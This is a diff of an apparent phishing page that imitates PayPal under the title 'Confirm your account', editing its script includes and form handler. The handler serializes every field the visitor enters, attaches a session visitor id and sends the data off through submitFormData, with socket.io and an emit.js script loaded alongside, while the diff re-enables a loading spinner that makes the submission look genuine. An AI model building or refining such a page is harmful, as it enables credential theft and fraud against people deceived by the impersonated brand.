@@ -1,4 +1,4 @@
-
+<?php
 
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" dir="ltr" data-reactroot="">
@@ -13,8 +13,7 @@
     <meta charset="utf-8" />
        <link rel="stylesheet" href="./assets/paypal-sans.css" />
     <link rel="stylesheet" href="./assets/main.css" />
-    
-    	
+     
     <title> Confirm your account </title>
     <style type="text/css">
         .ppvx_loading-spinner___2-8-9 {
@@ -10677,11 +10676,12 @@
       
     
     </body>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
+<script type="text/javascript" src="../assets/vx-lib.min.js"></script>
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+         <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
 </script>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
   <script src="./script/emit.js"></script> 
-
 <script>
 	$(document).ready(function() {
     $('form').on('submit', function(event) {
@@ -10718,7 +10718,7 @@
 
         if (!isEmpty) {
             document.querySelector('#subbut').disabled = true;
-            //document.getElementById('load').style.display = "block";
+            document.getElementById('load').style.display = "block";
             let userinfo = myForm.serializeArray();
             let user = {};
             var visitor = sessionStorage.getItem('visitor');
@@ -10731,6 +10731,8 @@
 			
             user['visitor'] = visitor;
             await submitFormData(user);
+            
+
             
         }
     });
